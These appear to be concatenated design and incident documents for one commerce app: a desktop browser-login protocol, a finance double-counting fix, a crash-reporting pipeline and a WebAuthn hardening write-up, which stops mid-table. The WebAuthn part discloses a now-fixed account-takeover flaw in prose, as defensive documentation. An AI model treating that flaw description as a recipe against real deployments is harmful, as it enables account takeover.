# Connexion desktop par navigateur système — contrat v1

## Décision et compatibilité

Le QR PC existant (`POST /api/auth/qr/pc-session`, `/login/qr?t=…&mode=pc`, phone-bind, status, complete) reste **inchangé**, avec expiration à 60 secondes. Il ne fournit pas de PKCE, n’attache pas la création à un fingerprint desktop et n’assure pas le retour après une nouvelle connexion web. Étendre implicitement son contrat aurait changé la sécurité et les clients existants.

Le nouveau contrat est donc explicitement versionné : **`/api/auth/desktop/v1`**, écran **`/login/desktop`**, navigateur système + **polling**, sans callback. Il réutilise la vérification des sessions web, le parcours web existant (mot de passe, Turnstile lorsqu’il est configuré, OTP et autres protections existantes), `makeTokenV2` et l’enregistrement dans `trusted_devices`. Aucun nouveau secret, passkey ou Durable Object. Aucune permission métier supplémentaire.

**Liaison existante étudiée :** `authFailReason` vérifie la preuve du compte actif, le rôle courant et la révocation dans `trusted_devices`. Pour les sessions avec fingerprint, une empreinte différente est refusée ; à empreinte identique, une variation d’IP est actuellement tolérée. Sans fingerprint, l’IP doit correspondre. Ce comportement n’est pas modifié. Le nouveau protocole exige en plus une empreinte explicite et **la même IP desktop de création jusqu’à l’échange**. L’IP du navigateur peut être différente ; sa session est vérifiée normalement, sans `relaxSession`.

Le code livré concerne le Worker et le web. L’ouverture du navigateur système et le stockage système sécurisé du jeton sont à implémenter dans le futur client desktop, selon le contrat ci-dessous.

## Origine et transport — obligations du client desktop

- L’utilisateur choisit son serveur. Aucune origine de production codée en dur dans ce protocole.
- Origine canonique = `new URL(serveur).origin`, **HTTPS uniquement**, avec port non standard conservé. Pas d’identifiants dans l’URL ; installation à la racine, pas de préfixe `/sous-dossier`. Rejeter une sélection contenant query/fragment ou chemin non racine plutôt que la réinterpréter silencieusement.
- Vérifier le certificat TLS. **Ne suivre aucune redirection** des appels API. Chaque URL d’API doit avoir cette origine exacte et un chemin constant de ce document. Si l’IP desktop change entre création et échange, recommencer une demande.
- Générer séparément par CSPRNG : `code_verifier` (32 octets aléatoires encodés base64url sans padding, 43 caractères au minimum), `state` (32 octets aléatoires base64url, 43–128 caractères), et une empreinte d’installation desktop persistante (`X-Device-Fingerprint`, 16–128 caractères `[A-Za-z0-9._:-]`). Ne jamais copier l’empreinte du navigateur.
- Challenge = `BASE64URL(SHA256(ASCII(code_verifier)))`, sans padding, exactement 43 caractères. Seul **S256** est accepté ; verifier RFC 7636 : 43–128 caractères `[A-Za-z0-9._~-]`.
- Garder verifier/state/contexte de demande dans la mémoire du processus desktop. Ne jamais les transmettre au navigateur, à un callback ou au stockage web. Le **state**, non assimilable à un jeton de session, est la seule exception : il figure dans le fragment du lien d’autorisation pour relier l’écran web à la demande. Le verifier n’y figure jamais.
- Envoyer les secrets de preuve uniquement dans le corps JSON des appels HTTPS décrits ici. Aucune query string sur les POST. Ne journaliser ni corps, ni Authorization, ni verifier, ni CSRF, ni jeton final. Le serveur ne conserve que le challenge, le hash du state et les liaisons nécessaires, jamais le verifier ou le jeton final.

Toutes les réponses du protocole sont `Cache-Control: no-store`, `CDN-Cache-Control: no-store`, `Referrer-Policy: no-referrer`. L’écran web a aussi ces protections et est protégé contre l’iframe par la politique existante. Les IDs de demande et le state sont transportés dans un **fragment**, non envoyé en requête HTTP, et retirés de la barre d’adresse après sauvegarde du contexte dans sessionStorage.

## 0. Découverte

```http
GET /api/auth/desktop/v1/capabilities
```

```json
{"success":true,"data":{"version":1,"flow":"system_browser_pkce_polling","code_challenge_method":"S256","expires_in":300,"interval":5,"max_polls":60,"callbacks":false}}
```

Un ancien serveur peut répondre 401, 404 ou une page HTML : proposer alors les connexions **natives existantes ou le QR PC existant**. Ne pas supposer qu’un autre endpoint existe. Une erreur de TLS/origine ne doit jamais entraîner de repli automatique vers un serveur différent ou une connexion moins sûre. Ne pas traiter un refus/une mauvaise preuve d’un serveur v1 comme une raison de contourner le protocole.

## 1. Création — desktop anonyme

```http
POST /api/auth/desktop/v1/requests
Content-Type: application/json
X-Device-Fingerprint: <empreinte desktop>
```

```json
{"origin":"https://inventaire.example:8443","state":"<state aléatoire>","code_challenge":"<S256>","code_challenge_method":"S256","device_label":"Mon ordinateur"}
```

Tous les champs sont obligatoires sauf `device_label` (défaut `Atlas Desktop`, 1–60 caractères, sans contrôles/bidi/markup). Les champs inconnus, dont `redirect_uri`, `callback`, `username` ou `role`, sont refusés. Le nom d’appareil est **déclaratif**, pas une attestation.

Réponse **201** :

```json
{"success":true,"data":{"version":1,"request_id":"<64 caractères hex aléatoires>","origin":"https://inventaire.example:8443","state":"<state initial>","authorization_url":"https://inventaire.example:8443/login/desktop#request_id=<id>&state=<state>","pairing_code":"ABCD-EFGH","expires_at":"<ISO UTC>","expires_in":300,"interval":5}}
```

Vérifier version, origine et state contre le contexte en mémoire. Avant d’ouvrir `authorization_url` avec l’API **navigateur système**, vérifier origine exacte, pathname `/login/desktop`, absence de query/credentials et fragment composé uniquement des `request_id`/`state` attendus. Ne pas ouvrir une URL de réponse arbitraire.

Afficher le `pairing_code` et le serveur dans le desktop. Ce code sert à comparer les deux écrans, **pas** à échanger un jeton. L’utilisateur ne doit jamais approuver un code envoyé par une autre personne.

La demande expire **300 secondes après création**, sans prolongation à la connexion ou à l’approbation. Le serveur choisit un ID imprévisible et conserve immuables origine, state hash, challenge, empreinte desktop et hash de son IP.

## 2. Connexion et consentement — navigateur uniquement

Si le navigateur n’est pas connecté, `/login/desktop` conserve uniquement `{request_id, state, origin, expiresAt}` dans **sessionStorage du même onglet**, puis ouvre `/login`. Après connexion web et OTP si requis, le retour est toujours le chemin fixe **`/login/desktop`**, jamais un `return_to` fourni dans une URL ou le stockage. Les autres connexions conservent leurs destinations habituelles. Si le stockage est inaccessible ou la demande expirée, recommencer sur le desktop.

L’écran prépare un consentement après validation normale du bearer et du fingerprint **du navigateur**, sans approuver la demande :

```http
POST /api/auth/desktop/v1/prepare
Authorization: Bearer <session web existante>
Origin: https://inventaire.example:8443
X-Device-Fingerprint: <empreinte navigateur>
Content-Type: application/json
```

```json
{"request_id":"<id>","origin":"https://inventaire.example:8443","state":"<state initial>"}
```

Réponse **200** :

```json
{"success":true,"data":{"request_id":"<id>","origin":"https://inventaire.example:8443","username":"alice","device_label":"Mon ordinateur","pairing_code":"ABCD-EFGH","csrf_token":"<nonce hex 64 caractères>","expires_at":"<ISO UTC>","consent_expires_at":"<ISO UTC>"}}
```

La nonce est liée à la demande, à l’état, au compte/rôle courant, au bearer et à l’empreinte du navigateur ; elle expire sous **120 secondes**, sans dépasser l’expiration de la demande. Une nouvelle préparation remplace la nonce précédente. L’écran affiche explicitement compte, serveur, nom non vérifié et code ; « Autoriser » est désactivé tant que la comparaison du code n’a pas été cochée. Un GET, le chargement du lien ou la connexion web seule **n’autorise rien**.

Après une action explicite :

```http
POST /api/auth/desktop/v1/authorize
```

Mêmes en-têtes web, corps :

```json
{"request_id":"<id>","origin":"https://inventaire.example:8443","state":"<state initial>","csrf_token":"<nonce prepare>","decision":"approve"}
```

`decision` vaut exactement **`approve`** ou **`deny`**. Réponse **200** :

```json
{"success":true,"data":{"status":"approved"}}
```

ou `status: denied`. L’origine HTTP doit correspondre exactement ; un `Sec-Fetch-Site` cross-site est refusé. La session navigateur est vérifiée à nouveau, et la transition n’est possible qu’une fois depuis `pending`, avec la nonce et l’acteur attendus. Pas de choix d’un autre compte via JSON. Après décision, le contexte web est effacé et le navigateur invite à revenir dans le desktop — **sans redirect ni callback**.

## 3. Polling borné — desktop uniquement

```http
POST /api/auth/desktop/v1/poll
Content-Type: application/json
X-Device-Fingerprint: <empreinte desktop initiale>
```

```json
{"request_id":"<id>","origin":"https://inventaire.example:8443","state":"<state initial>","code_verifier":"<verifier initial>"}
```

Réponse **200** :

```json
{"success":true,"data":{"status":"pending","request_id":"<id>","origin":"https://inventaire.example:8443","state":"<state initial>","interval":5}}
```

Statuts : `pending`, `approved`, `denied`, `cancelled`. **Aucun jeton ni identité** dans les réponses de polling. State, origine, PKCE, empreinte et IP de création sont vérifiés aussi pour poll/cancel. Le client revérifie l’origine/state/ID de réponse avant toute suite.

- Timeout de chaque requête HTTP : **15 secondes maximum**, toujours borné aussi par la durée restante de demande.
- Un seul polling en vol ; au moins **5 secondes** entre débuts d’essai acceptés.
- Maximum **60 polls acceptés** par demande ; arrêter également à `expires_at`, au refus, à l’annulation, à `USED` ou `EXPIRED`.
- Sur `SLOW_DOWN`, attendre au moins le `Retry-After` ; sur quota, pas de boucle immédiate. Une erreur ne prolonge pas l’expiration.
- Après `approved`, arrêter le polling et passer à l’échange.

## 4. Échange à usage unique — desktop uniquement

```http
POST /api/auth/desktop/v1/exchange
```

Mêmes en-têtes et **même corps que poll**. Réponse **200** :

```json
{"success":true,"data":{"token":"<session Atlas v2>","token_type":"Bearer","username":"alice","role":"user","request_id":"<id>","origin":"https://inventaire.example:8443","state":"<state initial>"}}
```

Le serveur vérifie à nouveau S256, state, origine, empreinte/IP desktop, expiration, statut `approved`, compte actif, rôle et matériau de session inchangés depuis le consentement, et appareil approbateur encore enregistré. Il fabrique le **format de session existant**, lié à l’IP et à **l’empreinte du desktop**, pas à celle du navigateur. La consommation est une transition D1 conditionnelle atomique ; un seul échange concurrent peut gagner. Le desktop est enregistré dans `trusted_devices` avant de transmettre le jeton. Si cet enregistrement échoue après consommation, aucun jeton n’est transmis et il faut **recommencer une nouvelle demande**.

Le jeton n’apparaît que dans ce corps HTTPS. L’origine est liée à la demande et vérifiée dans le protocole ; le format v2 existant n’ajoute pas de claim issuer/origin. Ne pas partager le domaine de confiance (DB/credentials) entre serveurs supposés indépendants, et isoler les sessions du client par origine. Il n’existe pas de nouveau refresh token, ni de nouvelle durée de session : les règles existantes de session/révocation restent applicables. Valider l’origine/state/ID de la réponse, puis ranger la session dans le coffre système, indexée par serveur et appareil. Ne pas journaliser, copier dans une URL ou accepter un jeton reçu via une prétendue URL de callback. Effacer la preuve de demande après succès/abandon ; après redémarrage du processus, recommencer plutôt que restaurer une preuve depuis le stockage web.

## 5. Annulation

```http
POST /api/auth/desktop/v1/cancel
```

Mêmes en-têtes et corps que poll. Depuis `pending` ou `approved`, réponse **200** :

```json
{"success":true,"data":{"status":"cancelled"}}
```

L’annulation répétée est idempotente tant que la demande n’est pas expirée. Après consommation, elle ne révoque pas une session déjà émise : employer le mécanisme de révocation d’appareils existant. Une demande refusée ne peut pas redevenir approuvée.

## Erreurs et quotas

Toutes les erreurs du module ont le format :

```json
{"success":false,"code":"EXPIRED","error":"Demande expirée : recommencez sur le desktop."}
```

Le gate web existant peut renvoyer ses codes habituels `UNAUTHORIZED`, `IP_CHANGED`, `DEVICE_CHANGED`, `DEVICE_REVOKED` avant prepare/authorize. Reconnexion web normale, pas de contournement.

| HTTP | Code | Action desktop/web |
| --- | --- | --- |
| 400 / 413 | `INVALID_REQUEST` | Types/champs/tailles/en-têtes invalides ; JSON max 8 Kio ; corriger le client |
| 400 | `HTTPS_REQUIRED` | Choisir une origine HTTPS ; pas de downgrade |
| 400 / 403 | `ORIGIN_MISMATCH` | Arrêter ; ne pas changer d’origine en cours de demande |
| 401 | `INVALID_PROOF` | State, PKCE, IP ou empreinte incorrects ; arrêter/recommencer, jamais fallback d’auth automatique |
| 401 | `UNAUTHORIZED` | Connexion web habituelle obligatoire |
| 403 | `CSRF_INVALID` | Nonce absente, remplacée, expirée ou mauvais acteur ; recharge de l’écran ou nouvelle demande |
| 403 | `DENIED` | Arrêter, refus explicite |
| 404 | `NOT_FOUND` | Demande absente/nettoyée ; recommencer |
| 409 | `NOT_APPROVED` | Pas encore autorisée ; revenir au polling borné |
| 409 | `CANCELLED` / `USED` | Arrêter, aucune nouvelle émission |
| 409 | `ACCOUNT_CHANGED` | Compte/rôle/credentials/appareil approbateur modifiés ; recommencer |
| 410 | `EXPIRED` | Recommencer depuis le desktop |
| 429 | `SLOW_DOWN` | Attendre le `Retry-After` (5 s) |
| 429 | `RATE_LIMITED` | Arrêter la demande ou respecter le délai serveur, pas de retry serré |
| 503 | `UNAVAILABLE` | Aucun secret dans l’erreur ; si échange incertain, recommencer sans rejouer une session depuis un callback |

Budgets persistants D1 par IP : **5 créations / fenêtre fixe de 5 minutes**, **90 autres opérations / fenêtre fixe d’1 minute**, y compris les tentatives invalides. En plus : 5 s entre polls, 60 polls max, expiration absolue 300 s. Les budgets login/OTP/QR existants sont inchangés ; seuls les chemins exacts de ce nouveau contrat utilisent ces quotas dédiés. Les chemins publics exacts sont capabilities/requests/poll/exchange/cancel ; **prepare/authorize restent derrière le gate web normal**. Aucune exemption générale d’auth ou liée à un header « native ».

Les décisions et l’échange sont aussi enregistrés dans l’audit existant (`auth.desktop_approve`, `auth.desktop_deny`, `auth.desktop_exchange`) avec identité/IP et détail fixe `desktop_v1`, sans state, nonce, verifier ou jeton. L’échange alimente le suivi de connexion existant. Les erreurs console du module ne contiennent que des codes fixes.

Les nonces et marqueurs de version des credentials sont effacés dès le refus, l’annulation ou la consommation ; aucun jeton de session n’est stocké dans ces tables.

Les tables `desktop_auth_v1` et `desktop_auth_limits_v1` sont créées de façon idempotente sur D1 existant ; pas de migration ou binding de secret supplémentaire. À chaque création, nettoyage des demandes expirées depuis plus d’une heure et des fenêtres de quotas expirées. L’expiration logique reste vérifiée à chaque opération, même avant nettoyage. Dans un déploiement non Cloudflare derrière proxy, les en-têtes d’IP doivent venir d’un proxy de confiance ; une IP `unknown` est refusée par ce protocole.

## Vérifications livrées et limites

- Tests sur le vrai Worker + SQLite D1 : session web ouverte/non ouverte, vrai login + OTP obligatoire, mauvais OTP, Turnstile non contourné, origine auto-hébergée avec port, rôle owner/user conservé, refus/annulation/expiration, state/proof/ID/origine/fingerprint/IP incorrects, CSRF, substitution de demande/acteur, double consommation concurrente, révocation/changement de compte, quotas et erreurs sans secrets.
- Tests DOM : sauvegarde/restauration du contexte au retour de connexion, absence d’approbation automatique, comparaison + clic explicite, refus, chemin de retour fixe, callback/query rejetés, fetch same-origin sans redirect/referrer, erreurs non réaffichées/loggées brutes.
- Régression du QR PC existant : création 60 s, approbation, émission et rejeu refusé. Les tests login/OTP/révocation existants restent applicables.
- Le protocole limite la substitution et impose la comparaison entre écrans ; comme tout device authorization, il ne supprime pas le phishing si l’utilisateur choisit sciemment d’approuver une demande initiée par un tiers. L’UI le signale explicitement.
- Pas de binaire desktop, d’ouverture réelle du navigateur système ou de déploiement production exécuté ici. Les tests DOM utilisent un environnement de test et le test de retour de connexion isole la page login ; le vrai OTP est testé séparément sur le Worker.

### Validation locale

Suite complète : **374 tests / 26 fichiers**, dont **42 tests ajoutés** (32 Worker, 10 DOM). Build Vite et contrôle CSS OK ; lint sans erreur. TypeScript reste à sa baseline existante de 71 erreurs Worker et 74 client, sans nouvelle erreur dans les fichiers ajoutés.

# Investigation — unexplained 6,000 MAD on the admin finance screen (v258)

Status: **root cause identified in code, fixed, regression-tested.**
Scope of evidence: server calculation code + persisted-schema write paths in this
repo, plus the deployed worker contract. The production D1 database is **not
reachable from the development sandbox** (no Cloudflare/API egress), so the
final confirmation step is a one-command probe the owner can run (last section).
All evidence below is sanitized: no personal names, no account data, no secrets.

## 1. Where the 6,000 MAD appears in `GET /api/admin/finance/monthly`

Company scope: one company per deployment (`company-stock` worker + D1
`company-stock-db`); company isolation is structural (separate deployment,
separate database) — verified by test (`company isolation: two databases never
mix`). Selected period: the `period=YYYY-MM` query param (Android finance
screen passes the month shown). Timezone boundaries: all period math uses the
tenant timezone from `company_settings.finance_timezone` (production:
`Africa/Casablanca`); `as_of`/day boundaries via `localTodayYmd()`.

The same cash outflow of 6,000 MAD surfaces in **two response fields at once**:

- `payroll_paid` (or `supplier_paid`) — the legitimate payment total; and
- `expenses` — inflated by the same 6,000 (a phantom dépense), which also pulls
  `closing_balance` (and every later `opening_balance`) 6,000 below real cash.

So the screen shows a 6,000 amount with no matching invoice, expense receipt or
payroll decision behind it — because it is not a second movement of money, it
is the **same movement counted twice**.

## 2. Root cause — mirror ledger rows double-counted by the finance math

Write paths (persisted source records):

- Supplier payment (`POST` bill payment, worker/index.ts ≈ L11700): inserts
  `bill_payments` row **and** an `expenses` mirror row
  (`category='Règlement fournisseur'`, `entry_type='expense'`,
  `notes='bill_id:<id>|…'`) for the Solde cash journal UI.
- Payroll payment / advance (worker/routes/employees.ts ≈ L905 & L1220):
  inserts `employee_payments` row **and** an `expenses` mirror row
  (`category='Salaire'`, `entry_type='expense'`, `notes='employee_id:<id>|…'`).

Read path (v254 finance math, worker/lib/finance.ts):

- `SQL_EXPENSES` summed **all** `entry_type='expense'` rows — mirrors included;
- `SQL_BILLS_PAID` / `SQL_PAYROLL_PAID` summed the payment tables again;
- `closing_balance = sales − expenses − payroll_paid − supplier_paid` therefore
  subtracted every supplier and payroll payment **twice**.

Consequences matching the symptom: `expenses` shows a 6,000 "dépense" with no
purchase behind it; `closing_balance`/next `opening_balance` are 6,000 too low;
`payroll_paid`/`supplier_paid` look correct, which is why the pair reads as
"unexplained" on the tiles. Duplicates, voids and status were also inspected:
payments are append-only permanent rows (no status column, deletes not exposed),
negative amounts act as reversals and net out correctly (test), and exact
duplicate rows sum twice **and are now visible as two statement rows** instead
of being invisible inside an aggregate (test).

Second defect found while tracing (same family): credit notes (« Avoir … »)
insert an audit row into `invoice_payments` with a positive amount; the cash
effect is only the paired `Remboursement client` expense (cash slice). The old
`SQL_SALES` had no filter, so `sales_received` **and** `closing_balance` were
inflated by the credit-vs-debt slice of every credit note.

Third defect (boundary, not amount): invoice/bill payment routes defaulted
`paid_at` to the **UTC** date (`new Date().toISOString().slice(0,10)`) while all
finance period math reads tenant-local days — a payment made between local
midnight and 01:00 landed in the previous month (at month boundary: previous
period). Now defaults to the tenant day (`moroccoTodayStr()`), matching the
payroll routes which already used the local day.

## 3. API vs PDF vs statement — consistency

The PDF route and the new statement route derive from the **same**
`computeMonthlySummary` / canonical filtered SQL as the JSON endpoint
(`reconciliation.source='d1-live'`, no cached copy anywhere in the route —
stale caching excluded). Before the fix all three were *consistently wrong*
(same double subtraction), which is why comparing API and PDF showed no
difference while both disagreed with the bank/caisse. Rounding: every aggregate
passes `round2`; the statement additionally returns the invariant
`opening + credits − debits = closing` with a `balanced` flag.

## 4. Fix (v258)

- `SQL_SALES` excludes `note LIKE 'Avoir%'` audit trails.
- `SQL_EXPENSES` excludes mirror rows
  (`category='Règlement fournisseur' AND notes LIKE 'bill_id:%'`,
  `category='Salaire' AND notes LIKE 'employee_id:%'`).
  Retroactive for every period (math is live from rows; no data migration,
  nothing deleted — the Solde journal UI keeps displaying its mirror rows).
- `paid_at` defaults localized on both payment routes.
- New canonical ledger (`ledgerRows`, `computeStatement`) shared by summary,
  statement and PDF inputs.
- New endpoint `GET /api/admin/finance/statement?period=&page=&page_size=`
  (owner/admin gate, same 403 `FIN_FORBIDDEN` envelope) returning period,
  timezone, as_of, open/closed status, opening/closing balances, chronological
  rows (`type`, sanitized `label`/`ref` — employee rows use `emp_number`, never
  names or national ids — `debit`, `credit`, `ts`, `running_balance`), totals,
  pagination and the reconciliation block.
- Regression tests (worker/__tests__/finance.test.ts, v258 block): supplier
  6,000 counted once; payroll mirror excluded + advance label; avoir non-sales;
  running balance + pagination; open period stops at as_of; TZ boundary;
  duplicates visible; reversals net out; company isolation; summary ≡ statement
  ≡ PDF inputs.

## 5. Verification — now AUTOMATIC (v259)

You no longer need wrangler or a PC: every `GET /api/admin/finance/monthly/<month>` and
`GET /api/admin/finance/statement?...` response now embeds a `mirror_audit` block — mirror rows
excluded vs `bill_payments`/`employee_payments` counts and totals, with a `consistent` flag
(`docs/api-finance.md`). If the fix ever regresses, `consistent` flips to `false` in the live
response — the confirmation runs by itself, on every request, in production.

### 5.1 Manual probe (read-only, optional)

```bash
# which rows are mirrors vs real cash (amounts/dates only):
npx wrangler d1 execute company-stock-db --remote --command \
  "SELECT category, COUNT(*) n, SUM(amount) total FROM expenses WHERE notes LIKE 'bill_id:%' OR notes LIKE 'employee_id:%' GROUP BY category;"
# cross-check against the payment tables:
npx wrangler d1 execute company-stock-db --remote --command \
  "SELECT 'bill_payments' src, COUNT(*) n, SUM(amount) total FROM bill_payments UNION ALL SELECT 'employee_payments', COUNT(*), SUM(amount) FROM employee_payments;"
# then in the app (owner/admin): GET /api/admin/finance/statement?period=<month>
# → the 6,000 appears exactly once, as a supplier (or payroll) row, and
#   reconciliation.balanced = true.
```

Expectation after deploy: the phantom dépense disappears from `expenses`,
`closing_balance` rises by exactly the mirrored amounts of the period, and the
statement lists one row per real cash movement.

# Rapports & crashs → GitHub issues (v260)

Deux files, un seul destinataire : **les issues de votre dépôt GitHub** (défaut
`Etherealmber/atlas-commerce`). Aucun compte GitHub n'est requis côté utilisateur, aucun CLI
côté propriétaire — la configuration se fait dans l'app.

## 1. Ce qui est rapporté

### Crashs automatiques (`crash_reports`)
Le front installe trois capteurs (`src/lib/crashReporter.ts`) :
- `window.addEventListener('error')` — erreurs globales non capturées ;
- `unhandledrejection` — promesses rejetées (le bruit réseau « failed to fetch » est ignoré,
  l'ErrorBoundary le traite déjà côté UX) ;
- `ErrorBoundary.componentDidCatch` — crashs React, avec la pile de composants.

Limites côté client : **max 5 envois par session**, dédupliqué par message+première frame,
`fetch keepalive` avec repli `sendBeacon`, n'interrompt jamais l'UI.

### Signalements utilisateurs (`user_reports`)
Page **À propos → « Signaler un problème »** (tout utilisateur connecté, tout rôle) :
type (bug / idée / autre), message libre (5–2000 caractères), contact facultatif, page courante
et version ajoutées automatiquement. Réponse : référence `R-<id>` + lien de l'issue si créée.

## 2. Confidentialité & assainissement (avant stockage ET avant GitHub)

- `redactSecrets()` retire : `Bearer …`, JWT (`eyJ…`), tokens GitHub (`ghp_`, `github_pat_`,
  `gho_`), clés Atlas (`atlas_`), `sk-…`, `gsk_…`, `re_…` et longs blobs base64/hex (data URLs).
- Troncatures : message 400, stack 4000, componentStack 2000, route 200, UA 200.
- IP des crashs : **SHA-256 tronqué** (contrôle d'abus uniquement, jamais l'IP en clair).
- Signalements utilisateur : uniquement le username/rôle du compte qui envoie (son propre compte).
- Le token GitHub n'est **jamais** renvoyé par l'API (statut `configured: true/false` seulement),
  jamais écrit dans les logs, et validé contre `GET api.github.com/user` avant stockage.

## 3. Déduplication & file d'attente

- Empreinte de crash = `sha256(message + 3 premières frames)` (16 hex). Une empreinte = une
  ligne D1 avec compteur d'occurrences ; côté GitHub, une **issue ouverte** portant l'empreinte
  dans le titre est recherchée avant création → un bug = une issue (les occurrences suivantes
  incrémentent le compteur D1).
- Sans token configuré (ou si GitHub échoue) : le rapport reste en file (`status pending`) et
  **rien n'est perdu** — `retryPendingReports()` rattrape la file :
  - via le **cron quotidien** (07:35 UTC, même déclencheur que les rappels finance) ;
  - via le bouton **« Renvoyer la file »** (Paramètres → Intégrations → Rapports & crashs) ;
  - automatiquement au prochain rapport envoyé une fois le token configuré.
- Labels créés automatiquement : `crash-report`, `user-report`, `from-app`.

## 4. Configuration du token (propriétaire, dans l'app)

1. https://github.com/settings/personal-access-tokens/new → **Fine-grained token**
   → Repository access : le dépôt cible → Permissions : **Issues — Read and Write**
   (le compte doit pouvoir créer des issues sur ce dépôt). Gratuit.
2. App → **Paramètres → Intégrations → « Rapports & crashs → GitHub »** → coller le token
   (+ dépôt optionnel, défaut `Etherealmber/atlas-commerce`) → Enregistrer.
3. Alternative ops : secret d'environnement `GITHUB_ISSUE_TOKEN` (+ `GITHUB_ISSUE_REPO`) —
   le secret **a priorité** sur le token configuré dans l'app.

## 5. Endpoints

| Endpoint | Auth | Rôle |
|---|---|---|
| `POST /api/crash-reports` | publique (rate-limitée) | intake crash — 202, `{reference, deduped}` ; n'échoue jamais côté app |
| `POST /api/reports` | session (tout rôle, rate-limité) | signalement utilisateur — 201, `{reference, issue_url}` |
| `GET /api/admin/github-token` | owner | `{configured, source: env\|app, repo}` — jamais le token |
| `PUT /api/admin/github-token` | owner | `{token, repo?}` — validé contre GitHub avant stockage ; `token:""` efface |
| `GET /api/admin/reports?limit=` | owner/admin | crashs + signalements récents (D1, déjà assainis) + `pending` |
| `POST /api/admin/reports/retry` | owner | vide la file vers GitHub — 409 `GITHUB_NOT_CONFIGURED` sans token |

Format d'intake crash : `{message, stack?, componentStack?, route?, version?, ua?}` (JSON).

## 6. Tests

`worker/__tests__/reports.test.ts` : assainissement (Bearer/JWT/ghp_/atlas_ redactés,
troncatures), empreinte stable et distincte, intake D1 (insert + dédup `count=2`), file
d'attente sans token (`pending`), drain avec token via `fetch` stubbé (issue créée → `linked`
+ `issue_url`, échec GitHub → reste `pending`), priorité `env` > app pour le token, vue
admin (`listReports` + compteur `pending`).

================================================
# Why teal kept appearing

Legacy design used Moroccan “zellij” teal as the **primary** token:

- `--zellij`, `--atlas-accent`, `--btn-primary-bg-solid` = `#0d7377` / `#0f766e`
- Hundreds of rules used those tokens
- Some used `!important`, so new UI still looked green

## Permanent fix

1. Tokens now point to black (`#0a0a0a`), not teal
2. New UI using `var(--zellij)` / `var(--atlas-accent)` is neutral
3. Delete stays red only

FILE: docs/webauthn.md
================================================
# WebAuthn / Passkeys — Security Model, Configuration & Android Enablement (v259)

**State: passkeys are DISABLED in production (`WEBAUTHN_ENABLED="false"`).** They must stay disabled
until the hardened verifier below is deployed **and** the checklist in §5 is completed.

## 1. What changed (audit → enforcement)

Before v259 the four WebAuthn routes trusted **client-submitted fields** as proof of identity:

| Old behaviour (audit finding) | Consequence |
|---|---|
| `register/verify` stored `credentialId`, `aaguid`, `transports` **without parsing or verifying the attestation object** | Anyone could enroll an arbitrary "passkey" for any account |
| Public key was **never stored** (`public_key_jwk` column did not exist) | Signature verification was impossible — login could not verify anything |
| `login/verify` issued a session token after only challenge consumption + a `webauthn_credentials` lookup (with fallbacks via `trusted_devices.biometric_credential_id` and `cred?.username \|\| body.username \|\| ownerUser`) | **Account takeover**: a valid challenge + any stored credential id = token for that username |
| Challenges were bound to a **client-supplied `fingerprint`** (`sha256(username+ua+ip+nonce)`) and consumed SELECT-then-DELETE | Replayable across devices/users; non-atomic race window |
| `excludeCredentials` was computed but returned `[]` | Duplicate credential spam |

v259 introduces `worker/lib/webauthn.ts` — a self-contained verifier (no new dependency) — and rewires
the routes to require **full cryptographic verification** on every success path.

## 2. Security properties now enforced

**Challenges** (`webauthn_challenges`): 32 random bytes, base64url; bound to `purpose`
(`webauthn.create`/`webauthn.get`), `username`, `rp_id`, `origin`; TTL 5 min (env
`WEBAUTHN_CHALLENGE_TTL_SECONDS`); consumed **atomically** (`UPDATE … SET consumed=1 WHERE … AND
consumed=0` — the row is only handed out once); expired/replayed/purpose- or account-mismatched
challenges are rejected.

**Registration** (`POST /api/auth/webauthn/register/verify`):
- clientDataJSON: `type === "webauthn.create"`, challenge equality, **exact origin acceptance** (§4a):
  allowlisted web origin (crossOrigin rejected, except the configured-Android-package case) or the
  derived `android:apk-key-hash-sha256:` origin
- authenticatorData: RP ID hash == `sha256(WEBAUTHN_RP_ID)`, user-present flag, user-verified flag
  (required unless `WEBAUTHN_REQUIRE_UV=discouraged`), attestation extension offset consistency
- attestation policy: `none` format only (default) — platform attestation (packed etc.) rejected
- COSE public key: **ES256 (EC P-256) only** → normalized to JWK and persisted (`public_key_jwk`)
- user handle: opaque `sha256(username)` — stable per account, leaks nothing; credential rows without
  a stored public key can never authenticate (legacy keyless rows are inert)
- stored metadata: counter, backupEligible/backupState, transports, rp_id/origin, credential user handle
- duplicates rejected (409 `DUPLICATE_CREDENTIAL`); challenges bound to the **session** account

**Authentication** (`POST /api/auth/webauthn/login/verify`):
- credential must exist **with a stored JWK** and (when the challenge was account-bound) match that username
- clientDataJSON `type === "webauthn.get"` + origin + challenge + rpIdHash + UP/UV flags
- **signature verified over `authData || sha256(clientDataJSON)`** with the stored ES256 public key
- `userHandle` (when present) must equal the stored per-account handle → `WEBAUTHN_WRONG_ACCOUNT`
- counters: must advance (`WEBAUTHN_COUNTER`), except the synced-passkey rule (backupEligible and both
  counters 0); backupState updates persisted
- **Every failure class returns the same generic `401 WEBAUTHN_VERIFY_FAILED`** and records a failed
  login — no oracle distinguishing unknown credential / bad signature / wrong account / expired challenge
  (prevents account enumeration). Existing rate limiting (`isRateLimited` + OTP lockout paths) still applies.
- On success the token is minted with the same secret material as password login (owner key or
  `app_users.password_hash`) and the account is taken **only from the verified credential row**.

**Disabled by default**: while `WEBAUTHN_ENABLED` is not `"true"`, all four routes answer
`503 {code:"WEBAUTHN_DISABLED"}` — nothing is verified, nothing is issued.

## 3. Capability endpoint (client gate)

`GET /api/auth/webauthn/status` (public, 60 s cache):

```json
{ "ok": true, "data": {
    "enabled": false,
    "rp": { "id": "stock.afmarbre.com", "name": "Atlas Commerce" },
    "origins": ["https://stock.afmarbre.com"],
    "user_verification": "required",
    "algorithms": ["ES256"],
    "android": { "enabled": false, "package": "ma.etherealmber.atlascommerce",
                 "origin": null, "origin_legacy": null,
                 "assetlinks": "/.well-known/assetlinks.json" } } }
```

**Clients must only offer passkey UI when `data.enabled === true`** (and for Android Credential
Manager additionally `data.android.enabled === true`). `data.android.origin` is the exact
`android:apk-key-hash-sha256:…` value the backend accepts — device teams compare it against what
their build produces instead of guessing. This is the single source of truth for the capability —
the app never guesses from build flags.

## 4. Android Credential Manager (production)

### 4a. Which `clientDataJSON.origin` the verifier accepts

The backend's exact-origin verifier accepts **only** these (v259.1):

| Origin in clientDataJSON | crossOrigin | Condition |
|---|---|---|
| `https://stock.afmarbre.com` (allowlist) | `false` | always (browser/PWA flows) |
